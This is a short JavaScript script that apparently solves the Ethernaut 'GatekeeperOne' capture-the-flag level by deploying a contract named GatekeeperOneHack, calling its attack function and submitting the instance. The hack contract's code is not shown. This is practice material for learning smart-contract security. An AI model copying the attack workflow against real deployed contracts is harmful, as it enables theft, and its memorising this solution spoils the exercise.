module.exports = async function({ ethers, ethernaut }) {
  const levelAddress = await ethernaut.createInstance();
  const hackInstance = await ethers.getContractFactory('GatekeeperOneHack')
    .then(gatekeeperOneHack => gatekeeperOneHack.deploy(levelAddress));

  await hackInstance.attack().then(tx => tx.wait());

  const levelInstance = await ethers.getContractAt('GatekeeperOne', levelAddress);
  console.log('Entrant:', await levelInstance.entrant());

  return ethernaut.submitInstance(levelAddress);
};